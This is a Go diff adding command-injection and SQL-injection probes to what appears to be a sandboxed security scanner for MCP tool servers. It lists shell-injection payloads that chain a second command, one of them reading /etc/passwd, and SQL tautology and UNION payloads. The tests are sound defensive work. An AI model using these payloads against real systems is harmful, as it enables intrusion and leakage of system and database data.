@@ -230,3 +230,103 @@ func secretsInOutput(ctx context.Context, c *mcp.Client, tools []mcp.Tool, _ Env
 	}
 	return nil
 }
+
+// --- l2-command-injection ----------------------------------------------------
+
+var reCommandParam = regexp.MustCompile(`host|ip|addr|domain|target|cmd|command|arg|option|flag|exec|script|shell|program|query|name|file|path`)
+
+// commandPayloads read the builder-mode canary file through the common ways a
+// shell runs a second command. They only read a file inside the cell.
+var commandPayloads = func() []string {
+	read := "cat /world/" + builderCanaryPath
+	return []string{
+		"127.0.0.1; " + read,
+		"127.0.0.1 && " + read,
+		"127.0.0.1 | " + read,
+		"127.0.0.1 || " + read,
+		"$(" + read + ")",
+		"`" + read + "`",
+		"127.0.0.1\n" + read,
+		"127.0.0.1; cat /etc/passwd",
+	}
+}()
+
+func init() {
+	register(Attack{
+		ID:     "l2-command-injection",
+		Level:  "L2",
+		Family: "06",
+		Title:  "Command injection runs attacker commands through a shell",
+		Checks: []scenario.Check{
+			{Fact: "canary_leaked", Canary: "WORLD"},
+			{Fact: "sensitive_file_read"},
+		},
+		World:   []scenario.File{{Path: builderCanaryPath, Content: "{{canary.WORLD}}\n"}},
+		Network: "none",
+		Run:     commandInjection,
+	})
+}
+
+func commandInjection(ctx context.Context, c *mcp.Client, tools []mcp.Tool, _ Env) error {
+	for _, t := range toolsUpTo(tools) {
+		s := parseSchema(t.InputSchema)
+		params := stringParams(s, reCommandParam)
+		for _, p := range params[:min(len(params), 3)] {
+			for _, payload := range commandPayloads {
+				args := minimalArgs(s)
+				args[p] = payload
+				if _, err := c.CallTool(ctx, t.Name, args); err != nil {
+					return fmt.Errorf("probe %q: %w", t.Name, err)
+				}
+			}
+		}
+	}
+	return nil
+}
+
+// --- l2-sql-injection ----------------------------------------------------------
+
+var reSQLParam = regexp.MustCompile(`name|id|user|email|customer|account|order|product|query|search|filter|term|keyword|q$|sort|where|sql|table|column|field|category|status`)
+
+// sqlPayloads break out of a quoted value, add tautologies and probe UNION
+// column counts. They read only; nothing writes or drops data.
+var sqlPayloads = []string{
+	"'",
+	"\"",
+	"redfilade' OR '1'='1",
+	"redfilade' OR 1=1--",
+	"1 OR 1=1",
+	"redfilade' UNION SELECT NULL--",
+	"redfilade' UNION SELECT NULL, NULL--",
+	"redfilade' UNION SELECT NULL, NULL, NULL--",
+	"redfilade' AND redfilade_no_such_column = 1--",
+}
+
+func init() {
+	register(Attack{
+		ID:      "l2-sql-injection",
+		Level:   "L2",
+		Family:  "08",
+		Title:   "SQL injection changes the server's database queries",
+		Checks:  []scenario.Check{{Fact: "internals_leaked"}},
+		Network: "none",
+		Run:     sqlInjection,
+	})
+}
+
+func sqlInjection(ctx context.Context, c *mcp.Client, tools []mcp.Tool, _ Env) error {
+	for _, t := range toolsUpTo(tools) {
+		s := parseSchema(t.InputSchema)
+		params := stringParams(s, reSQLParam)
+		for _, p := range params[:min(len(params), 3)] {
+			for _, payload := range sqlPayloads {
+				args := minimalArgs(s)
+				args[p] = payload
+				if _, err := c.CallTool(ctx, t.Name, args); err != nil {
+					return fmt.Errorf("probe %q: %w", t.Name, err)
+				}
+			}
+		}
+	}
+	return nil
+}
